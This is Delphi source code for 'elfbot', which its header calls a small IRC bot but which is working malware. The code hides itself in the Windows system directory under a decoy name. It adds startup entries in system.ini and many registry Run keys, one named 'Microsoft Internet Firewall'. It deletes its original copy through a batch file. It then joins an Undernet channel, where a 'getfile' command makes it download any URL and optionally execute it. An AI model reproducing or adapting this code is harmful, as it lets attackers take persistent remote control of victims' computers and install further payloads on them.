{
   Small IRC Bot, Written By p0ke.
}

program elfbot;

uses
  Windows,
  Winsock,
  uStrList,
  ShellApi;

const
  // sent with USER Name Name@MAIL Name Name
  const_mail            : string = 'hotmale.com';
  // Commando to download a file
  const_download        : string = 'getfile';
  // Sent when download is successfull
  const_success         : string = 'Download success';
  // Sent when download failed
  const_fail            : string = 'Download failed';
  // Channel to join
  const_channel         : string = '##buttman';
  // Server to connect to
  const_server          : string = 'uk.undernet.org';
  const_server2         : string = 'eu.undernet.org';
  const_server3         : string = 'irc.undernet.org';
  const_server4         : string = 'de.undernet.org';
  const_server5         : string = 'se.undernet.org';
  // Characters the bots uses in nickname.
  // NOTE: Some irc-servers have problems with
  //       {[]}\^~_-| so dont use them unless your sure the server can take it
  const_randomnamestr   : string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  // Server port
  const_port            : integer = 6667;

var
  Sock          :TSocket;
  Addr          :TSockAddrIn;
  WSA           :TWSAData;

  Nick          :String;
  Ident         :String;
  Channel       :String;
  Key           :String;

  Temp          :String;
  IRCTemp       :String;
  SendBuf       :String;

  buffer        :array [0..9000] of char;

  function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

Procedure SplitParams(S: String; Var X: TStrList);
Var
  I: WorD;
Begin
  X.Clear;
  Repeat
    I := Pos(' ', S);
    If I > 0 Then
    Begin
      X.Add(Copy(S, 1, I-1));
      Delete(S, 1, I);
    End;
  Until I = 0;
  X.Add(S);
End;

function senddata(text: string): bool;
var
  return: integer;
begin
  result := false;
  return := send(sock, text[1], length(text), 0);
  if return <> socket_error then result := true;
end;

function createnickname: string;
var
  tmp: string;
begin
  tmp := const_randomnamestr;

  randomize;
  result := '';
  while length(result) < 20 do
    result := result + tmp[random(length(tmp))+1];
end;

function ExtractFileExt(const Filename: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Filename);
  for i := L downto 1 do
  begin
    Ch := Filename[i];
    if (Ch = '.') then
    begin
      Result := Copy(Filename, i + 1, L - i);
      Break;
    end;
  end;
end;

procedure readdata;
var
  Param  :TStrList;

  filename      :string;
  savename      :string;
  execute       :bool;

begin
  Param := TStrList.Create;

  Temp := Copy(CreateNickName,1,6);
  IRCTemp := 'USER '+Temp+' '+Temp+'@'+const_mail+' '+Temp+' '+Temp+#10;
  senddata(irctemp);
  IRCTemp := 'NICK '+Temp+#10;
  senddata(irctemp);

  while recv(sock, Buffer, sizeof(Buffer), 0) > 0 do
  begin
    IRCTemp := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));

    While Pos(#10, IRCTemp) > 0 Do
    begin
      Temp := Copy(IRCTemp, 1, Pos(#10, IRCTemp)-1);
      Delete(IRCTemp, 1, Pos(#10, IRCTemp));

      If Temp[Length(Temp)] = #13 Then
        Delete(Temp, Length(Temp), 1);

      SplitParams(Temp, Param);

      if param.Count > 3 then
        if param.Strings(3) = ':'+const_download then
        begin
          if param.count > 4 then
          begin
            filename := param.Strings(4);
            if param.Count > 5 then
            begin
              if param.Strings(5) = '*' then
                savename := 'c:\'+createnickname+'.'+ExtractFileExt(filename)
              else
                savename := param.Strings(5);
            end else
              savename := 'c:\'+createnickname+'.'+ExtractFileExt(filename);
            if param.Count > 6 then
              execute := (param.Strings(6) = '1')
            else
              execute := false;

            If UrlDownloadToFile(0, pChar(filename), pChar(savename), 0, 0) = s_ok Then
            begin
              IRCTemp := 'PRIVMSG '+const_channel+' :'+const_success+'. ('+savename+')'#10;
              SendData(IRCTemp);
              If Execute then
                ShellExecute(0, 'open', pchar(savename), 0, 0, 1);
            end else
            begin
              IRCTemp := 'PRIVMSG '+const_channel+' :'+const_fail+'.'#10;
              SendData(IRCTemp);
            end;
          end;
        end;

      if param.Strings(0) = 'PING' then
        senddata('PONG '+param.Strings(1)+#10);

      if (param.Strings(0) = 'Nickname') and (param.Strings(4) = 'use') then
      begin
        // nickname is in use
        senddata('NICK '+createnickname+#10);
      end;

      if pos('MOTD', temp) > 0 then
      begin
        // join channel
        senddata('JOIN '+const_channel+#10);
      end;

      if param.Strings(1) = '366' then
      begin
        // joined channel
        // senddata('PRIVMSG ##elfbot :-- ebot loaded --'#10);
      end;

    end;
  end;
end;

procedure connectirc(server: string; port: integer);
begin
  WSAStartUp(257, WSA);
    Sock := Socket(af_inet, sock_stream, 0);
    addr.sin_family := af_inet;
    addr.sin_port := htons(port);
    addr.sin_addr.S_addr := inet_addr(pchar(server));
    if connect(sock, addr, sizeof(addr)) > socket_error then
      readdata;
  WSACleanUp;
end;

Function ipstr(HostName: String): String;
Type
  TAPInAddr = Array[0..100] Of PInAddr;
  PAPInAddr = ^TAPInAddr;
Var
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  PPTr       : PAPInAddr;
  I          : Integer;
Label
  Abort;
Begin
  Result := '';
  WSAStartUp($101, WSAData);
  Try
    HostEntPtr := GetHostByName(pChar(HostName));
    If HostEntPtr = NIL Then Goto Abort;
    PPTr := PAPInAddr(HostEntPtr^.h_addr_list);
    I := 0;
    While PPTr^[I] <> NIL Do
    Begin
      If HostName = '' Then
      Begin
        If (Pos('168', inet_nToa(PPTr^[I]^)) <> 1) And (Pos('192', inet_nToa(PPTr^[I]^)) <> 1) Then
        Begin
          Result := Inet_nToa(PPTr^[I]^);
          Goto Abort;
        End;
      End Else
        Result := (Inet_nToa(PPTr^[I]^));
      Inc(I);
    End;
Abort:
  Except
  End;
  WSACleanUp;
End;

Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
Var
 Key : Hkey;
 Siz : Cardinal;
Begin
 RegOpenKey(kRoot, pChar(Path), Key);
 Siz := 2048;
 RegSetValueEx( Key, pChar(Value), 0, REG_SZ, @Str[1], Siz);
 RegCloseKey(Key);
End;

Procedure Install;
Var
  Dir:  Array[0..255]Of Char;
  Str:  String;
  Bat:  TextFile;
Begin
  Randomize;
  Sleep((Random(5)+1)*1000);

  If CreateMutexA(NIL, FALSE, '--eBot--') = ERROR_ALREADY_EXISTS Then ExitProcess(0);

  GetSystemDirectory(Dir, 256);
  Str := String(Dir)+'\lexplore_.exe';
  copyfile(pchar(paramstr(0)), pchar(str), false);

  // startup
  writeprivateprofilestring(      'boot', 'shell', 'Explorer.exe lexplore_.exe', 'system.ini');
  SetRegValue(HKEY_CURRENT_USER , 'Software\Microsoft\OLE'                               , 'WinDLL', Str);
  SetRegValue(HKEY_CURRENT_USER , 'Software\Microsoft\Windows\CurrentVersion\Run'        , 'WinEx', Str);
  SetRegValue(HKEY_CURRENT_USER , 'Software\Microsoft\Windows\CurrentVersion\RunOnce'    , 'RegEx', Str);
  SetRegValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'        , 'ShellRun', Str);
  SetRegValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'    , 'APIClass', Str);
  SetRegValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx'  , 'RegMutex', Str);
  SetRegValue(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices', 'Microsoft Internet Firewall', Str);

  if paramstr(0) <> str then
  begin
    winexec(pChar(str), 1);
    assignfile(bat, 'c:\winexec.bat');
    rewrite(bat);
    writeln(bat, 'del '+paramstr(0));
    writeln(bat, 'del c:\winexec.bat');
    writeln(bat, 'cls');
    writeln(bat, 'exit');
    closefile(bat);
    winexec('c:\winexec.bat', 0);
    exitprocess(0);
  end;
End;

begin
  install;
  repeat
    connectirc(ipstr(const_server ), const_port);
    connectirc(ipstr(const_server2), const_port);
    connectirc(ipstr(const_server3), const_port);
    connectirc(ipstr(const_server4), const_port);
    connectirc(ipstr(const_server5), const_port);
  until 1 = 0;
end.
